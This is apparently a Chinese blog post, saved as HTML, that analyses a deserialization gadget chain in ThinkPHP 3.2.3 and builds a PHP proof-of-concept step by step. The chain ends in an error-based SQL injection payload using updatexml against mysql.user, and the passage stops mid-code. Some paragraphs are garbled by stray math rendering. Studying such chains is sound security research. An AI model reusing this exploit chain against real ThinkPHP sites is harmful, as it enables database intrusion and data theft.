@@ -1,0 +1,499 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>thinkphp3.2.3反序列化初探 | ch1e的自留地</title>
+<link rel="shortcut icon" href="https://ch0x01e.github.io/favicon.ico?v=1709471671274">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ch0x01e.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="thinkphp3.2.3反序列化初探 | ch1e的自留地 - Atom Feed" href="https://ch0x01e.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="前言
+摆了好几天，好几个人老说我前言说摆烂，确实是在摆烂，前两天浅学了一下thinkphp3，今天来学学thinkphp3反序列化链构造
+反序列化链分析
+首先我们需要通过thinkphp来一个反序列化的demo
+&lt;?php
+names..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ch0x01e.github.io">
+  <img class="avatar" src="https://ch0x01e.github.io/images/avatar.png?v=1709471671274" alt="">
+  </a>
+  <h1 class="site-title">
+    ch1e的自留地
+  </h1>
+  <p class="site-description">
+    Manners maketh man
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://ch1e.cn/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              thinkphp3.2.3反序列化初探
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-10-16
+              </span>
+              <span>
+                13 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="前言">前言</h1>
+<p>摆了好几天，好几个人老说我前言说摆烂，确实是在摆烂，前两天浅学了一下thinkphp3，今天来学学thinkphp3反序列化链构造</p>
+<h1 id="反序列化链分析">反序列化链分析</h1>
+<p>首先我们需要通过thinkphp来一个反序列化的demo</p>
+<pre><code class="language-php">&lt;?php
+namespace Home\Controller;
+use Think\Controller;
+class IndexController extends Controller {
+    public function index(){
+        $a=unserialize(base64_decode(I('post.data')));
+    }
+}
+</code></pre>
+<p>php的反序列化和java不同，php的反序列化起点大部分是那俩魔术方法__wakeup和__destruct,因此我们寻找反序列化链就需要去搜寻这种魔术方法,其实有个小技巧，就是在找反序列化起点的类的时候，尽可能去找可控变量多的类，因为可控变量多才能让我们控制程序的可能更大。</p>
+<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220517215939001.png" alt="image-20220517215939001" loading="lazy"></figure>
+<p>这里我们找到Think\Image\Driver\Imagick这个类，他这里的img属性可控</p>
+<pre><code class="language-php">public function __destruct() {
+    empty($this-&gt;img) || $this-&gt;img-&gt;destroy();
+}
+</code></pre>
+<p>这里判断了img是否为空并且调用了他的destory方法，注意这里的destroy方法是没有参数的，但是我们如果需要构造反序列化链，必须找到同名方法，所以继续去搜索destory方法，但是我们只能找到三个有一个参数的destory的方法，这里的话就有条件了，**在ThinkPHP框架中，调用一个有参函数却不传入参数，这在PHP5中可以这么执行，但在PHP7中却会异常抛出，因此要复现的话不能用PHP7的环境。**所以我们这里选择的是php5版本的，继续看代码，他调用了自身的handler属性的delete方法，但是这里的话只有this-&gt;sessionName可控，sessID因为是需要在上面__destruct方法中传入，但是他调用的是无参的方法。</p>
+<figure data-type="image" tabindex="2"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220517225006164.png" alt="image-20220517225006164" loading="lazy"></figure>
+<p>继续往下走，寻找delete方法，来到ThinkPHP/Mode/Lite/Model.class.php。$options默认为空数组</p>
+<figure data-type="image" tabindex="3"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220517231832002.png" alt="image-20220517231832002" loading="lazy"></figure>
+<p>可以看到他如果满足两个if判断的条件就会进入到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>d</mi><mi>e</mi><mi>l</mi><mi>e</mi><mi>t</mi><mi>e</mi><mo separator="true">,</mo><mi mathvariant="normal">但</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">这</mi><mi mathvariant="normal">次</mi><mi mathvariant="normal">传</mi><mi mathvariant="normal">入</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">参</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">是</mi><mi>d</mi><mi>a</mi><mi>t</mi><mi>a</mi><mo>[</mo></mrow><annotation encoding="application/x-tex">this-&gt;delete,但是这次传入的参数是data[</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">但</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">次</span><span class="mord cjk_fallback">传</span><span class="mord cjk_fallback">入</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">是</span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mopen">[</span></span></span></span>pk],继续往下走，有个问题就是如果where为键的键值对为空，会直接返回false，解决办法也给出来了，就是设置where=1=1</p>
+<figure data-type="image" tabindex="4"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220517232434092.png" alt="image-20220517232434092" loading="lazy"></figure>
+<p>继续寻找有delete方法的地方，找到ThinkPHP/Library/Think/Db/Driver.class.php</p>
+<pre><code class="language-php">/**
+ * 删除记录
+ * @access public
+ * @param array $options 表达式
+ * @return false | integer
+ */
+public function delete($options=array()) {
+    $this-&gt;model  =   $options['model'];
+    $this-&gt;parseBind(!empty($options['bind'])?$options['bind']:array());
+    $table  =   $this-&gt;parseTable($options['table']);
+    $sql    =   'DELETE FROM '.$table;
+    if(strpos($table,',')){// 多表删除支持USING和JOIN操作
+        if(!empty($options['using'])){
+            $sql .= ' USING '.$this-&gt;parseTable($options['using']).' ';
+        }
+        $sql .= $this-&gt;parseJoin(!empty($options['join'])?$options['join']:'');
+    }
+    $sql .= $this-&gt;parseWhere(!empty($options['where'])?$options['where']:'');
+    if(!strpos($table,',')){
+        // 单表删除支持order和limit
+        $sql .= $this-&gt;parseOrder(!empty($options['order'])?$options['order']:'')
+        .$this-&gt;parseLimit(!empty($options['limit'])?$options['limit']:'');
+    }
+    $sql .=   $this-&gt;parseComment(!empty($options['comment'])?$options['comment']:'');
+    return $this-&gt;execute($sql,!empty($options['fetch_sql']) ? true : false);
+}
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220517233303882.png" alt="image-20220517233303882" loading="lazy"></figure>
+<p>继续跟进parseTable方法</p>
+<pre><code class="language-php">protected function parseTable($tables) {
+    if(is_array($tables)) {// 支持别名定义
+        $array   =  array();
+        foreach ($tables as $table=&gt;$alias){
+            if(!is_numeric($table))
+                $array[] =  $this-&gt;parseKey($table).' '.$this-&gt;parseKey($alias);
+            else
+                $array[] =  $this-&gt;parseKey($alias);
+        }
+        $tables  =  $array;
+    }elseif(is_string($tables)){
+        $tables  =  explode(',',$tables);
+        array_walk($tables, array(&amp;$this, 'parseKey'));
+    }
+    return implode(',',$tables);
+}
+</code></pre>
+<p>parseTable方法判断了一下$tables是否是数组，如果是数组，调用parseKey方法对其键和值进行处理，其实是很危险的，因为parseKey没有进行任何过滤</p>
+<pre><code class="language-php">protected function parseKey(&amp;$key) {
+    return $key;
+}
+</code></pre>
+<p>因此这里就可以执行SQL语句，可以产生一个SQL注入了</p>
+<h1 id="反序列化链构造">反序列化链构造</h1>
+<p>首先入口点是ThinkPHP/Library/Think/Image/Driver/Imagick.class.php的__destruct方法，因此我们需要精心构造这个类并且序列化这个类来获得一个POC，因为需要调用$this-&gt;img-&gt;destory，所以需要带上img参数，先写出最开始的一步</p>
+<pre><code class="language-php">&lt;?php
+namespace Think\Image\Driver{
+    use Think\Image;
+    class Imagick{
+        private $img;
+    }
+}
+</code></pre>
+<p>他的下一步是ThinkPHP/Library/Think/Session/Driver/Memcache.class.php的destory方法，这里他是需要通过调用<code>$this-&gt;handle-&gt;delete($this-&gt;sessionName.$sessID);</code>,因此需要把Memcache也写进来，并且带上handle属性</p>
+<pre><code class="language-php">&lt;?php
+namespace Think\Image\Driver{
+    use Think\Image;
+    class Imagick{
+        private $img;
+    }
+}
+namespace Think\Session\Driver{
+    use Think\Model;
+    class Memcache{
+        protected $handle = null;
+    }
+}
+</code></pre>
+<p>然后他需要去调用ThinkPHP/Mode/Lite/Model.class.php的delete方法，这里是有参数需要传入的，所以我们得考虑参数的问题，但是之前在分析的时候说了，需要满足两个if条件，此时<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>o</mi><mi>p</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mi>s</mi><mi mathvariant="normal">传</mi><mi mathvariant="normal">入</mi><mi mathvariant="normal">空</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">组</mi><mi mathvariant="normal">即</mi><mi mathvariant="normal">可</mi><mi mathvariant="normal">满</mi><mi mathvariant="normal">足</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">但</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">他</mi><mi mathvariant="normal">还</mi><mi mathvariant="normal">需</mi><mi mathvariant="normal">要</mi><mi mathvariant="normal">调</mi><mi mathvariant="normal">用</mi><mi>g</mi><mi>e</mi><mi>t</mi><mi>P</mi><mi>k</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">因</mi><mi mathvariant="normal">此</mi><mi>p</mi><mi>k</mi><mi mathvariant="normal">属</mi><mi mathvariant="normal">性</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">必</mi><mi mathvariant="normal">须</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">并</mi><mi mathvariant="normal">且</mi><mi mathvariant="normal">会</mi><mi mathvariant="normal">判</mi><mi mathvariant="normal">断</mi><mi>d</mi><mi>a</mi><mi>t</mi><mi>a</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">否</mi><mi mathvariant="normal">为</mi><mi mathvariant="normal">空</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">为</mi><mi mathvariant="normal">空</mi><mi mathvariant="normal">则</mi><mi mathvariant="normal">不</mi><mi mathvariant="normal">满</mi><mi mathvariant="normal">足</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">所</mi><mi mathvariant="normal">以</mi><mi>d</mi><mi>a</mi><mi>t</mi><mi>a</mi><mi mathvariant="normal">必</mi><mi mathvariant="normal">须</mi><mi mathvariant="normal">并</mi><mi mathvariant="normal">且</mi><mi mathvariant="normal">非</mi><mi mathvariant="normal">空</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">并</mi><mi mathvariant="normal">且</mi><mi mathvariant="normal">需</mi><mi mathvariant="normal">要</mi><mi>d</mi><mi>a</mi><mi>t</mi><mi>a</mi><mo>[</mo></mrow><annotation encoding="application/x-tex">options传入空数组即可满足，但是他还需要调用getPk，因此pk属性是必须的，并且会判断data是否为空，为空则不满足，所以data必须并且非空，并且需要data[</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">o</span><span class="mord mathdefault">p</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault">s</span><span class="mord cjk_fallback">传</span><span class="mord cjk_fallback">入</span><span class="mord cjk_fallback">空</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">即</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">满</span><span class="mord cjk_fallback">足</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">但</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">他</span><span class="mord cjk_fallback">还</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">调</span><span class="mord cjk_fallback">用</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">此</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord cjk_fallback">属</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">必</span><span class="mord cjk_fallback">须</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">并</span><span class="mord cjk_fallback">且</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">判</span><span class="mord cjk_fallback">断</span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">否</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">空</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">空</span><span class="mord cjk_fallback">则</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">满</span><span class="mord cjk_fallback">足</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">以</span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord cjk_fallback">必</span><span class="mord cjk_fallback">须</span><span class="mord cjk_fallback">并</span><span class="mord cjk_fallback">且</span><span class="mord cjk_fallback">非</span><span class="mord cjk_fallback">空</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">并</span><span class="mord cjk_fallback">且</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">要</span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mopen">[</span></span></span></span>pk]不为空和null，到现在为止目前的代码如下</p>
+<pre><code class="language-php">&lt;?php
+namespace Think\Image\Driver{
+    use Think\Image;
+    class Imagick{
+        private $img;
+    }
+}
+namespace Think\Session\Driver{
+    use Think\Model;
+    class Memcache{
+        protected $handle = null;
+    }
+}
+namespace Think{
+    use Think\Db\Driver\Mysql;
+    class Model {
+        protected $data=array();
+        protected $pk;
+        protected $options=array();
+    }
+}
+</code></pre>
+<p>下一步是调用ThinkPHP/Library/Think/Db/Driver.class.php的delete方法，现在就需要我们精心构造我们的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>o</mi><mi>p</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mi>s</mi><mi mathvariant="normal">了</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">从</mi><mi mathvariant="normal">结</mi><mi mathvariant="normal">尾</mi><mi mathvariant="normal">开</mi><mi mathvariant="normal">始</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">首</mi><mi mathvariant="normal">先</mi><mi mathvariant="normal">‘</mi></mrow><annotation encoding="application/x-tex">options了，从结尾开始，首先`</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">o</span><span class="mord mathdefault">p</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault">s</span><span class="mord cjk_fallback">了</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">从</span><span class="mord cjk_fallback">结</span><span class="mord cjk_fallback">尾</span><span class="mord cjk_fallback">开</span><span class="mord cjk_fallback">始</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">首</span><span class="mord cjk_fallback">先</span><span class="mord">‘</span></span></span></span>this-&gt;parseTable(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>o</mi><mi>p</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mi>s</mi><msup><mo>[</mo><mo mathvariant="normal">′</mo></msup><mi>t</mi><mi>a</mi><mi>b</mi><mi>l</mi><msup><mi>e</mi><mo mathvariant="normal">′</mo></msup><mo>]</mo><mo>)</mo><mo separator="true">;</mo><mi mathvariant="normal">‘</mi><mo separator="true">,</mo><mi mathvariant="normal">他</mi><mi mathvariant="normal">至</mi><mi mathvariant="normal">少</mi><mi mathvariant="normal">需</mi><mi mathvariant="normal">要</mi><mi mathvariant="normal">有</mi><mi mathvariant="normal">一</mi><mi mathvariant="normal">个</mi><mi>t</mi><mi>a</mi><mi>b</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">为</mi><mi mathvariant="normal">键</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">键</mi><mi mathvariant="normal">值</mi><mi mathvariant="normal">对</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">这</mi><mi mathvariant="normal">里</mi><mi mathvariant="normal">的</mi><mi>t</mi><mi>a</mi><mi>b</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">拼</mi><mi mathvariant="normal">接</mi><mi>s</mi><mi>q</mi><mi>l</mi><mi mathvariant="normal">语</mi><mi mathvariant="normal">句</mi><mi mathvariant="normal">并</mi><mi mathvariant="normal">且</mi><mi mathvariant="normal">执</mi><mi mathvariant="normal">行</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">所</mi><mi mathvariant="normal">以</mi><mi mathvariant="normal">我</mi><mi mathvariant="normal">们</mi><mi mathvariant="normal">只</mi><mi mathvariant="normal">要</mi><mi mathvariant="normal">拼</mi><mi mathvariant="normal">接</mi><mi mathvariant="normal">恶</mi><mi mathvariant="normal">意</mi><mi mathvariant="normal">的</mi><mi>s</mi><mi>q</mi><mi>l</mi><mi mathvariant="normal">语</mi><mi mathvariant="normal">句</mi><mi mathvariant="normal">即</mi><mi mathvariant="normal">可</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">并</mi><mi mathvariant="normal">且</mi><mi mathvariant="normal">需</mi><mi mathvariant="normal">要</mi><mi mathvariant="normal">在</mi><mi mathvariant="normal">上</mi><mi mathvariant="normal">一</mi><mi mathvariant="normal">步</mi><mi mathvariant="normal">中</mi><mi mathvariant="normal">满</mi><mi mathvariant="normal">足</mi><mi>w</mi><mi>h</mi><mi>e</mi><mi>r</mi><mi>e</mi><mo>=</mo><mn>1</mn><mo>=</mo><mn>1</mn><mi mathvariant="normal">。</mi><mi mathvariant="normal">并</mi><mi mathvariant="normal">且</mi><mi mathvariant="normal">这</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">组</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">第</mi><mi mathvariant="normal">二</mi><mi mathvariant="normal">次</mi><mi mathvariant="normal">被</mi><mi mathvariant="normal">处</mi><mi mathvariant="normal">理</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">只</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">‘</mi><mi>T</mi><mi>h</mi><mi>i</mi><mi>n</mi><mi>k</mi><mi>P</mi><mi>H</mi><mi>P</mi><mi mathvariant="normal">/</mi><mi>M</mi><mi>o</mi><mi>d</mi><mi>e</mi><mi mathvariant="normal">/</mi><mi>L</mi><mi>i</mi><mi>t</mi><mi>e</mi><mi mathvariant="normal">/</mi><mi>M</mi><mi>o</mi><mi>d</mi><mi>e</mi><mi>l</mi><mi mathvariant="normal">.</mi><mi>c</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>s</mi><mi mathvariant="normal">.</mi><mi>p</mi><mi>h</mi><mi>p</mi><mo>−</mo><mo>&gt;</mo><mi>d</mi><mi>a</mi><mi>t</mi><mi>a</mi><mo>[</mo></mrow><annotation encoding="application/x-tex">options[&#x27;table&#x27;]);`,他至少需要有一个table为键的键值对，这里的table是拼接sql语句并且执行，所以我们只要拼接恶意的sql语句即可，并且需要在上一步中满足where=1=1。并且这个数组是第二次被处理的，只是`ThinkPHP/Mode/Lite/Model.class.php-&gt;data[</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathdefault">o</span><span class="mord mathdefault">p</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault">s</span><span class="mopen"><span class="mopen">[</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">b</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">]</span><span class="mclose">)</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">‘</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">他</span><span class="mord cjk_fallback">至</span><span class="mord cjk_fallback">少</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">b</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">键</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">键</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">的</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">b</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">拼</span><span class="mord cjk_fallback">接</span><span class="mord mathdefault">s</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord cjk_fallback">语</span><span class="mord cjk_fallback">句</span><span class="mord cjk_fallback">并</span><span class="mord cjk_fallback">且</span><span class="mord cjk_fallback">执</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">只</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">拼</span><span class="mord cjk_fallback">接</span><span class="mord cjk_fallback">恶</span><span class="mord cjk_fallback">意</span><span class="mord cjk_fallback">的</span><span class="mord mathdefault">s</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord cjk_fallback">语</span><span class="mord cjk_fallback">句</span><span class="mord cjk_fallback">即</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">并</span><span class="mord cjk_fallback">且</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">步</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">满</span><span class="mord cjk_fallback">足</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">并</span><span class="mord cjk_fallback">且</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">第</span><span class="mord cjk_fallback">二</span><span class="mord cjk_fallback">次</span><span class="mord cjk_fallback">被</span><span class="mord cjk_fallback">处</span><span class="mord cjk_fallback">理</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">只</span><span class="mord cjk_fallback">是</span><span class="mord">‘</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">h</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord">/</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mord">/</span><span class="mord mathdefault">L</span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord">/</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord">.</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord">.</span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord mathdefault">p</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mopen">[</span></span></span></span>pk]<code>，也是</code>ThinkPHP/Mode/Lite/Model.class.php-&gt;data[$this-&gt;pk]`,并且在第一次的delete中where对应的值也是空，所以构造恶意的array后，代码如下</p>
+<pre><code class="language-php">&lt;?php
+namespace Think\Image\Driver{
+    use Think\Image;
+    class Imagick{
+        private $img;
+        public function __construct(){
+            $this-&gt;img=new \Think\Session\Driver\Memcache();
+        }
+    }
+}
+namespace Think\Session\Driver{
+    use Think\Model;
+    class Memcache{
+        protected $handle = null;
+        public function __construct(){
+            $this-&gt;img=new Model();
+        }
+    }
+}
+namespace Think{
+    use Think\Db\Driver\Mysql;
+    class Model {
+        protected $data=array();
+        protected $pk;
+        protected $options=array();
+        public function __construct()
+        {
+            $this-&gt;options['where'] = '';
+            $this-&gt;pk = 'id';
+            $this-&gt;data[$this-&gt;pk] = array(
+                'where'=&gt;'1=1',
+                'table'=&gt;'mysql.user where 1=updatexml(1,concat(0x7e,user(),0x7e),1)#'
+
+            );
+        }
+    }
+}
+namespace Home\Controller{
+    use Think\Controller;
+    class DemoController extends Controller {
+        public function index(){
